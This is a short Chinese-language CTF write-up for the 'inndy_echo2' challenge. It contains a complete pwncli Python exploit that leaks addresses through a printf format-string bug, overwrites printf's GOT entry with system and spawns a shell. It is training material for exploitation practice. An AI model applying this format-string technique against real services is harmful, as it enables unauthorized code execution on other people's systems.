# inndy_echo2



### 解题思路

简单的`printf`，修改`printf@got`为`system`然后再输入`/bin/sh`获取`shell`

<!-- more -->

### exp

```python
from pwncli import *

cli_script()

p = gift['io']
e = gift['elf']
libc = gift['libc']

p.sendline("%41$p,%43$p")
msg = p.recvline()

code_addr, libc_addr = msg.split(b",")
code_base_addr = int16(code_addr.decode()) - e.sym['main'] - 74
libc_base_addr = int16(libc_addr.decode()) - libc.sym['__libc_start_main'] - 240

e.address = code_base_addr
libc.address = libc_base_addr

log_address("code_base_addr", code_base_addr)

payload = fmtstr_payload(offset=6, writes={e.got['printf']:libc.sym['system']}, write_size="short", write_size_max="short")

p.sendline(payload)

sleep(1)

p.sendline("/bin/sh")

p.interactive()
```

### 引用与参考
1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2021-08-14-inndy-echo2/  

